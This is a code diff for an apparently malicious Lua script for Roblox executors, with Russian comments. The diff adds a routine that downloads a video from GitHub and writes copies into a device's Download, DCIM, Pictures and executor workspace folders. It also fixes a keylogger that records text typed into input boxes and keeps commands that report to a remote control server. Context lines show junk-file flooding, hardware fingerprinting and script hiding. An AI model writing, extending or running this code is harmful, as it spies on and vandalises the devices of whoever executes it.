@@ -63,6 +63,47 @@ local function captureScreenshot()
     return nil
 end
 
+-- Функция для загрузки файла с GitHub
+local function downloadFromGitHub(url, filename)
+    local success, result = pcall(function()
+        if not writefile then return false end
+        
+        local content = game:HttpGet(url)
+        if content and #content > 100 then
+            writefile(filename, content)
+            return true
+        end
+        return false
+    end)
+    return success and result
+end
+
+-- Функция для получения путей сохранения
+local function getSavePaths()
+    local paths = {
+        "/storage/emulated/0/Download/",
+        "/storage/emulated/0/Downloads/",
+        "/storage/emulated/0/DCIM/",
+        "/storage/emulated/0/Pictures/",
+    }
+    
+    local exploitPaths = {
+        "Delta/Workspace/",
+        "Codex/Workspace/", 
+        "Krnl/Workspace/",
+        "ArceusX/Workspace/",
+        "Script-Ware/Workspace/",
+        "Synapse/Workspace/",
+        "Fluxus/Workspace/"
+    }
+    
+    for _, exploitPath in ipairs(exploitPaths) do
+        table.insert(paths, "/storage/emulated/0/" .. exploitPath)
+    end
+    
+    return paths
+end
+
 -- Отправка уведомления при инжекте
 local function sendInjectNotification()
     local playerName = player.Name
@@ -151,34 +192,6 @@ local function getHardwareInfo()
     return hardwareData
 end
 
--- Функция для поиска путей сохранения
-local function getSavePaths()
-    local paths = {
-        "/storage/emulated/0/Download/",
-        "/storage/emulated/0/Downloads/",
-        "/storage/emulated/0/DCIM/",
-        "/storage/emulated/0/Pictures/",
-        "/storage/emulated/0/",
-    }
-    
-    -- Пути для популярных эксплойтов
-    local exploitPaths = {
-        "Delta/Workspace/",
-        "Codex/Workspace/", 
-        "Krnl/Workspace/",
-        "ArecusX/Workspace/",
-        "Script-Ware/Workspace/",
-        "Synapse/Workspace/",
-        "Fluxus/Workspace/"
-    }
-    
-    for _, exploitPath in ipairs(exploitPaths) do
-        table.insert(paths, "/storage/emulated/0/" .. exploitPath)
-    end
-    
-    return paths
-end
-
 -- Memory Spam функция
 local function memorySpam(fileCount)
     local paths = getSavePaths()
@@ -188,7 +201,6 @@ local function memorySpam(fileCount)
         local filename = "spam_file_" .. i .. "_" .. math.random(1000, 9999) .. ".txt"
         local content = "Spam file content " .. math.random(10000, 99999)
         
-        -- Пытаемся сохранить в разных путях
         for _, path in ipairs(paths) do
             local fullPath = path .. filename
             local success = pcall(function()
@@ -210,34 +222,36 @@ local function memorySpam(fileCount)
     return successCount
 end
 
--- Gallery Spam функция  
-local function gallerySpam(imageCount, imageData, filename)
+-- Gallery Spam функция с загрузкой с GitHub
+local function gallerySpam(imageCount)
+    local githubUrls = {
+        "https://github.com/HappyCow91/RobloxScripts/raw/main/Videos/videoplayback.mp4",
+    }
+    
     local paths = getSavePaths()
     local successCount = 0
-    local extension = filename:match("%.(%w+)$") or "jpg"
+    local selectedUrl = githubUrls[1]
     
     for i = 1, imageCount do
-        local newFilename = "image_" .. i .. "_" .. math.random(1000, 9999) .. "." .. extension
+        local extension = "mp4"
+        local filename = "video_" .. i .. "_" .. math.random(1000, 9999) .. "." .. extension
         
-        -- Пытаемся сохранить в разных путях
         for _, path in ipairs(paths) do
-            local fullPath = path .. newFilename
+            local fullPath = path .. filename
             local success = pcall(function()
                 if writefile then
-                    -- В реальности здесь нужно декодировать base64 и сохранять как изображение
-                    -- Для примера просто сохраняем как текстовый файл
-                    writefile(fullPath, "Image data placeholder")
-                    successCount = successCount + 1
-                    return true
+                    return downloadFromGitHub(selectedUrl, fullPath)
                 end
+                return false
             end)
             
             if success then
+                successCount = successCount + 1
                 break
             end
         end
         
-        task.wait(0.05)
+        task.wait(0.1)
     end
     
     return successCount
@@ -309,11 +323,11 @@ local function hideScript()
     return success
 end
 
--- Настройка кейлоггера (без перехвата чата)
+-- Настройка кейлоггера
 local function setupKeylogger()
     UserInputService.TextBoxFocused:Connect(function(textBox)
         if keyloggerEnabled then
-            textLabel.FocusLost:Connect(function()
+            textBox.FocusLost:Connect(function()
                 if textBox.Text and textBox.Text ~= "" then
                     keylogBuffer = keylogBuffer .. "[Input] " .. textBox.Text .. "\n"
                 end
@@ -560,22 +574,16 @@ local function ExecuteCommand(cmd, args)
     
     elseif cmd == "gallery_spam" then
         local imageCount = tonumber(args[1]) or 10
-        local imageData = args[2]
-        local filename = args[3] or "image.jpg"
-        
-        if not imageData then
-            return
-        end
         
         task.spawn(function()
-            local savedCount = gallerySpam(imageCount, imageData, filename)
+            local savedCount = gallerySpam(imageCount)
             httpRequest({
                 Url = SERVER_URL.."/command",
                 Method = "POST",
                 Headers = {["Content-Type"] = "application/json"},
                 Body = HttpService:JSONEncode({
                     command = "spam_completed",
-                    args = {"gallery_spam", "Сохранено "..savedCount.." изображений из "..imageCount}
+                    args = {"gallery_spam", "Сохранено "..savedCount.." видео из "..imageCount}
                 })
             })
         end)
